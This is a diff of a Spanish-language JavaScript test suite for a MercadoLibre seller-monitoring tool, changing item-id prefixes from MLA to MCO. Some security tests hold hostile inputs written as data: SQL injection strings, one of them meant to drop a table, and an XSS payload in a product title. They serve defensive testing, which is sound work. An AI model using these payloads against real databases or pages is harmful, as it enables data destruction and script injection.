     try {
-      const f = await tr.OFICIOS.nichos.foto(new (await import('../src/meli.js')).MeliClient({}), { tipo: 'nicho', ref: 'tendencias del sitio', radar: true }, 'MLA');
+      const f = await tr.OFICIOS.nichos.foto(new (await import('../src/meli.js')).MeliClient({}), { tipo: 'nicho', ref: 'tendencias del sitio', radar: true }, 'MCO');
       if (!f.radar || Object.keys(f.nichos).join() !== 'organizador de cocina,cargador celular') throw new Error('el radar no tomó las tendencias: ' + Object.keys(f.nichos));
       contiene(tr.OFICIOS.nichos.cambios({ ref: 'tendencias del sitio', radar: true }, null, f).map((x) => x.texto).join(' '), '(en tendencia)');
     } finally { mercado.tendencias = tend; }
@@ -1211,18 +1211,18 @@ async function pruebas() {
   // ───────────── Nico, Paula, Iván, Valen, Gabi, Sole y Fede ─────────────
   const pv = await import('../src/postventa.js');
   await caso('Nico: días de stock por producto, se corta esta semana y sin stock vendiendo', async () => {
-    mercado.items.MLA111 = { ...(mercado.items.MLA111 || {}), available_quantity: 1 };   // vende 2 en 30 días → 15 días… y con 1 u.
-    mercado.items.MLA222 = { ...(mercado.items.MLA222 || {}), available_quantity: 0 };   // vendía y se quedó sin stock
+    mercado.items.MCO111 = { ...(mercado.items.MCO111 || {}), available_quantity: 1 };   // vende 2 en 30 días → 15 días… y con 1 u.
+    mercado.items.MCO222 = { ...(mercado.items.MCO222 || {}), available_quantity: 0 };   // vendía y se quedó sin stock
     tr.actualizarEquipo((d) => { for (const k of Object.keys(d.snapshots)) if (k.startsWith('stock|')) delete d.snapshots[k]; });
     const r = await tr.correrCiclo({ solo: ['stock'], forzar: true });
     const t = deTrab('stock', r);
-    contiene(t, '🛑 MLA222', 'SIN STOCK', 'perdés', '[stock-ml]');
+    contiene(t, '🛑 MCO222', 'SIN STOCK', 'perdés', '[stock-ml]');
     contiene(await T.run({ accion: 'resultados', trabajador: 'Nico' }), 'Encargado de stock', 'Días de stock', '🛑 SIN STOCK', 'sin stock vendiendo');
     const r2 = await tr.correrCiclo({ solo: ['stock'], forzar: true });
-    if (deTrab('stock', r2).includes('MLA222')) throw new Error('repitió el aviso de sin stock');
+    if (deTrab('stock', r2).includes('MCO222')) throw new Error('repitió el aviso de sin stock');
   });
   await caso('Paula: preguntas sin responder (y las que pasan 2 h) y mensajes sin leer', async () => {
-    preguntasPend = [...preguntasPend, { id: 556, item_id: 'MLA222', text: '¿Viene con caja?', date_created: new Date(Date.now() - 3 * 3600000).toISOString() }];
+    preguntasPend = [...preguntasPend, { id: 556, item_id: 'MCO222', text: '¿Viene con caja?', date_created: new Date(Date.now() - 3 * 3600000).toISOString() }];
     mensajesPend = [{ resource: '/packs/2000001', count: 2 }];
     const r = await tr.correrCiclo({ solo: ['atencion'], forzar: true });
     const t = deTrab('atencion', r);
@@ -1246,47 +1246,47 @@ async function pruebas() {
   await caso('Valen: reputación, métricas que suben y opinión negativa nueva', async () => {
     let r = await tr.correrCiclo({ solo: ['reputacion'], forzar: true });
     contiene(tr.alertasRecientes({ trabajador: 'reputacion' }).map((a) => a.texto).join('\n'), 'Tu reputación', 'verde', 'MercadoLíder platinum');
-    opinionesML.MLA111 = { rating_average: 4.2, paging: { total: 13 }, reviews: [{ id: 2, rate: 1, title: 'Malísimo', content: 'No mantiene el calor', date_created: new Date().toISOString() }, ...opinionesML.MLA111.reviews] };
+    opinionesML.MCO111 = { rating_average: 4.2, paging: { total: 13 }, reviews: [{ id: 2, rate: 1, title: 'Malísimo', content: 'No mantiene el calor', date_created: new Date().toISOString() }, ...opinionesML.MCO111.reviews] };
     demoraRate = 0.12;
     r = await tr.correrCiclo({ solo: ['reputacion'], forzar: true });
-    contiene(deTrab('reputacion', r), 'Opinión de 1 estrella(s) en MLA111', 'No mantiene el calor', 'bajó de 4.6 a 4.2', 'Subió tu tasa de despachos con demora', '[reputacion-ml]');
+    contiene(deTrab('reputacion', r), 'Opinión de 1 estrella(s) en MCO111', 'No mantiene el calor', 'bajó de 4.6 a 4.2', 'Subió tu tasa de despachos con demora', '[reputacion-ml]');
   });
   await caso('Gabi: catálogo perdido con precio ganador y si conviene por margen; recuperado', async () => {
-    ptwMLA111 = { status: 'winning', current_price: 42000, price_to_win: 42000, boosts: [] };
+    ptwMCO111 = { status: 'winning', current_price: 42000, price_to_win: 42000, boosts: [] };
     await tr.correrCiclo({ solo: ['catalogo'], forzar: true });
-    ptwMLA111 = { status: 'competing', current_price: 42000, price_to_win: 39900, boosts: [{ id: 'fulfillment' }] };
+    ptwMCO111 = { status: 'competing', current_price: 42000, price_to_win: 39900, boosts: [{ id: 'fulfillment' }] };
     let r = await tr.correrCiclo({ solo: ['catalogo'], forzar: true });
-    contiene(deTrab('catalogo', r), '🏷️ Perdiste el catálogo de MLA111', 'ganás con $ 39.900', 'fulfillment', 'por unidad', '[competencia-ml]');
-    ptwMLA111 = { status: 'winning', current_price: 39900, price_to_win: 39900, boosts: [] };
+    contiene(deTrab('catalogo', r), '🏷️ Perdiste el catálogo de MCO111', 'ganás con $ 39.900', 'fulfillment', 'por unidad', '[competencia-ml]');
+    ptwMCO111 = { status: 'winning', current_price: 39900, price_to_win: 39900, boosts: [] };
     r = await tr.correrCiclo({ solo: ['catalogo'], forzar: true });
-    contiene(deTrab('catalogo', r), '✅ Recuperaste el catálogo de MLA111');
+    contiene(deTrab('catalogo', r), '✅ Recuperaste el catálogo de MCO111');
   });
   await caso('Sole: publicaciones moderadas con el motivo en castellano, y cuando se resuelven', async () => {
-    itemsPorEstado.under_review = ['MLA444']; mercado.items.MLA444 = { status: 'under_review', sub_status: ['waiting_for_patch'], title: 'Mate imperial' };
-    portadaPobre = ['MLA222'];
+    itemsPorEstado.under_review = ['MCO444']; mercado.items.MCO444 = { status: 'under_review', sub_status: ['waiting_for_patch'], title: 'Mate imperial' };
+    portadaPobre = ['MCO222'];
     let r = await tr.correrCiclo({ solo: ['moderaciones'], forzar: true });
-    contiene(deTrab('moderaciones', r), '🚫 MLA444', 'en revisión', 'esperando que corrijas datos', 'MLA222', 'foto de portada de baja calidad', '[moderaciones-ml]');
+    contiene(deTrab('moderaciones', r), '🚫 MCO444', 'en revisión', 'esperando que corrijas datos', 'MCO222', 'foto de portada de baja calidad', '[moderaciones-ml]');
     itemsPorEstado.under_review = []; portadaPobre = [];
     r = await tr.correrCiclo({ solo: ['moderaciones'], forzar: true });
-    contiene(deTrab('moderaciones', r), '✅ Se resolvió la moderación de MLA444');
+    contiene(deTrab('moderaciones', r), '✅ Se resolvió la moderación de MCO444');
   });
   await caso('Fede: proveedor por publicación de ML y por web (schema.org); precio, recargo y sin stock', async () => {
     process.env.ML_PROVEEDOR_PERMITIR_LOCAL = '1';
-    mercado.items.MLA900 = { price: 20000, available_quantity: 50, status: 'active', title: 'Termo mayorista (proveedor)' };
-    mercado.items.MLA111 = { ...(mercado.items.MLA111 || {}), price: 42000, available_quantity: 8 };
-    contiene(await T.run({ accion: 'asignar', trabajador: 'Fede', ref: 'MLA111', fuente: 'MLA900', recargo: 80 }), 'Fede', 'proveedor MLA900', 'recargo 80%');
-    contiene(await T.run({ accion: 'asignar', trabajador: 'Fede', ref: 'MLA222', fuente: `http://localhost:${PUERTO}/proveedor/termo` }), 'Fede');
+    mercado.items.MCO900 = { price: 20000, available_quantity: 50, status: 'active', title: 'Termo mayorista (proveedor)' };
+    mercado.items.MCO111 = { ...(mercado.items.MCO111 || {}), price: 42000, available_quantity: 8 };
+    contiene(await T.run({ accion: 'asignar', trabajador: 'Fede', ref: 'MCO111', fuente: 'MCO900', recargo: 80 }), 'Fede', 'proveedor MCO900', 'recargo 80%');
+    contiene(await T.run({ accion: 'asignar', trabajador: 'Fede', ref: 'MCO222', fuente: `http://localhost:${PUERTO}/proveedor/termo` }), 'Fede');
     let r = await tr.correrCiclo({ solo: ['proveedores'], forzar: true });
     contiene(deTrab('proveedores', r), 'el proveedor está a $ 20.000', 'tendrías que vender a $ 36.000');
-    mercado.items.MLA900 = { ...mercado.items.MLA900, price: 23000 };
+    mercado.items.MCO900 = { ...mercado.items.MCO900, price: 23000 };
     paginasProveedor.termo = { precio: '27.500,00', disponible: 'https://schema.org/OutOfStock' };
-    mercado.items.MLA222 = { ...(mercado.items.MLA222 || {}), available_quantity: 5, status: 'active' };
+    mercado.items.MCO222 = { ...(mercado.items.MCO222 || {}), available_quantity: 5, status: 'active' };
     r = await tr.correrCiclo({ solo: ['proveedores'], forzar: true });
     const t = deTrab('proveedores', r);
-    contiene(t, 'cambió el precio: $ 20.000 → $ 23.000 (↑ 15.0%)', 'tendrías que vender a $ 41.400', '$ 25.000 → $ 27.500', '🛑 El proveedor se quedó SIN STOCK', 'MLA222', '[proveedores-ml]');
+    contiene(t, 'cambió el precio: $ 20.000 → $ 23.000 (↑ 15.0%)', 'tendrías que vender a $ 41.400', '$ 25.000 → $ 27.500', '🛑 El proveedor se quedó SIN STOCK', 'MCO222', '[proveedores-ml]');
     contiene(await T.run({ accion: 'resultados', trabajador: 'Fede' }), 'Proveedores', 'Precio sugerido', '🛑 agotado', 'localhost');
-    let m = ''; try { await T.run({ accion: 'asignar', trabajador: 'Fede', ref: 'MLA111', fuente: 'ftp://x' }); } catch (e) { m = e.message; } contiene(m, 'Falta fuente');
-    m = ''; try { await T.run({ accion: 'asignar', trabajador: 'Fede', ref: 'termo', fuente: 'MLA900' }); } catch (e) { m = e.message; } contiene(m, 'TU publicación');
+    let m = ''; try { await T.run({ accion: 'asignar', trabajador: 'Fede', ref: 'MCO111', fuente: 'ftp://x' }); } catch (e) { m = e.message; } contiene(m, 'Falta fuente');
+    m = ''; try { await T.run({ accion: 'asignar', trabajador: 'Fede', ref: 'termo', fuente: 'MCO900' }); } catch (e) { m = e.message; } contiene(m, 'TU publicación');
     delete process.env.ML_PROVEEDOR_PERMITIR_LOCAL;
   });
   await caso('Fede: seguridad — solo https público (sin red interna, sin credenciales en la URL)', async () => {
@@ -1328,20 +1328,20 @@ async function pruebas() {
     contiene(await T.run({ accion: 'equipo' }), '🗄️ Base de datos', 'mediciones');
   });
   await caso('base: historial día por día de Vera (mín/máx/variación) y de Tomás (ventas y $/mes)', async () => {
-    const v = await T.run({ accion: 'historial', ref: 'MLA500' });
-    contiene(v, 'Historial', 'Vera · MLA500', 'Mínimo $ 36.000', 'máximo $ 45.000', '↓', 'Precio rival', 'Tu precio');
-    // simular 2 días reales: la primera medición de MLA650 pasa a hace 48 h
-    const db0 = bd.db(); const p0 = db0.prepare("SELECT MIN(id) AS id FROM mediciones WHERE ref = 'MLA650' AND trabajador = 'ventas'").get().id;
+    const v = await T.run({ accion: 'historial', ref: 'MCO500' });
+    contiene(v, 'Historial', 'Vera · MCO500', 'Mínimo $ 36.000', 'máximo $ 45.000', '↓', 'Precio rival', 'Tu precio');
+    // simular 2 días reales: la primera medición de MCO650 pasa a hace 48 h
+    const db0 = bd.db(); const p0 = db0.prepare("SELECT MIN(id) AS id FROM mediciones WHERE ref = 'MCO650' AND trabajador = 'ventas'").get().id;
     db0.prepare('UPDATE mediciones SET t = t - ? WHERE id = ?').run(2 * 86400000, p0);
-    const t = await T.run({ accion: 'historial', ref: 'MLA650', trabajador: 'Tomás' });
-    contiene(t, 'Tomás · MLA650', 'Vendió ~10 u. en 2.0 días', '≈ 5.0 u./día', '/mes', 'Vendió ese día');
+    const t = await T.run({ accion: 'historial', ref: 'MCO650', trabajador: 'Tomás' });
+    contiene(t, 'Tomás · MCO650', 'Vendió ~10 u. en 2.0 días', '≈ 5.0 u./día', '/mes', 'Vendió ese día');
     if (!/≈ \$ 1\.(49\d|50\d)\.\d{3}\/mes/.test(t)) throw new Error('facturación mensual fuera de rango: ' + t.slice(0, 200));
     contiene(await T.run({ accion: 'historial', trabajador: 'Martina' }), 'Tu mejor puesto', 'líder(es) distinto(s)');
     contiene(await T.run({ accion: 'historial', trabajador: 'Sofía' }), 'Top 3 de tendencias', 'termo de vidrio');
   });
   await caso('base: inyección SQL en ref no hace nada (consultas preparadas)', async () => {
     contiene(await T.run({ accion: 'historial', ref: "x' OR '1'='1" }), 'Sin mediciones');
-    contiene(await T.run({ accion: 'historial', ref: "MLA500'; DROP TABLE mediciones; --" }), 'Sin mediciones');
+    contiene(await T.run({ accion: 'historial', ref: "MCO500'; DROP TABLE mediciones; --" }), 'Sin mediciones');
     if (!bd.estadoDB().mediciones.n) throw new Error('se borró la tabla');
   });
   await caso('base: Claude y el servicio 24/7 escriben y leen a la vez sin "database is locked"', async () => {
@@ -1368,8 +1368,8 @@ async function pruebas() {
   await caso('base: migra sola las alertas del JSON de la versión anterior (una sola vez)', async () => {
     const dirM = fs.mkdtempSync(path.join(os.tmpdir(), 'meli-mig-'));
     fs.writeFileSync(path.join(dirM, 'trabajadores.json'), JSON.stringify({ bandeja: [
-      { t: Date.now() - 3600000, trabajador: 'precios', ref: 'MLA1', nivel: 'alta', texto: 'vieja alerta 1', leida: false },
-      { t: Date.now() - 1800000, trabajador: 'ventas', ref: 'MLA2', nivel: 'media', texto: 'vieja alerta 2', leida: true } ] }));
+      { t: Date.now() - 3600000, trabajador: 'precios', ref: 'MCO1', nivel: 'alta', texto: 'vieja alerta 1', leida: false },
+      { t: Date.now() - 1800000, trabajador: 'ventas', ref: 'MCO2', nivel: 'media', texto: 'vieja alerta 2', leida: true } ] }));
     const { out } = await correrHijo(`const t = await import(${src('trabajadores.js')});
       const a = t.leerBandeja({ marcar: true }); const b = t.leerBandeja({ marcar: true }); const todas = t.leerBandeja({ todas: true, marcar: false });
       console.log(JSON.stringify({ a: a.length, b: b.length, todas: todas.length, json: t.leerEquipo().bandeja.length }));`, { MELI_CONFIG_DIR: dirM });
@@ -1405,8 +1405,8 @@ async function pruebas() {
     planilla.recibidos.length = 0;
     await T.run({ accion: 'drive', url: urlPlanilla, carpeta: dirD });
     const h = planilla.recibidos.at(-1).resultados['Historial'];
-    if (!h || h[0][0] !== 'Fecha' || !h.some((f) => f[2] === 'MLA500')) throw new Error('la planilla no recibió el historial');
-    contiene(fs.readFileSync(path.join(dirD, rs.CARPETA_NOMBRE, 'Historial.csv'), 'utf8'), 'Fecha,Trabajador', 'MLA500', 'Vera');
+    if (!h || h[0][0] !== 'Fecha' || !h.some((f) => f[2] === 'MCO500')) throw new Error('la planilla no recibió el historial');
+    contiene(fs.readFileSync(path.join(dirD, rs.CARPETA_NOMBRE, 'Historial.csv'), 'utf8'), 'Fecha,Trabajador', 'MCO500', 'Vera');
     await T.run({ accion: 'drive', quitar: 'todo' });
     fs.rmSync(dirD, { recursive: true, force: true }); delete process.env.ML_DRIVE_PERMITIR_LOCAL;
   });
@@ -1420,7 +1420,7 @@ async function pruebas() {
 
   // ───────────── El tablero del día ─────────────
   await caso('tablero: se arma con lo de los 19 trabajadores, archivo privado y se regenera solo', async () => {
-    mercado.items.MLA500 = { ...(mercado.items.MLA500 || {}), title: '</script><img src=x onerror=alert(1)>Termo trucho' };
+    mercado.items.MCO500 = { ...(mercado.items.MCO500 || {}), title: '</script><img src=x onerror=alert(1)>Termo trucho' };
     await tr.correrCiclo({ solo: ['precios'], forzar: true });
     const t = await tool('ml_tablero').run({});
     contiene(t, 'Tablero del día listo', 'file://', 'tablero.html', 'funcionando', 'para atender', 'tutorial');
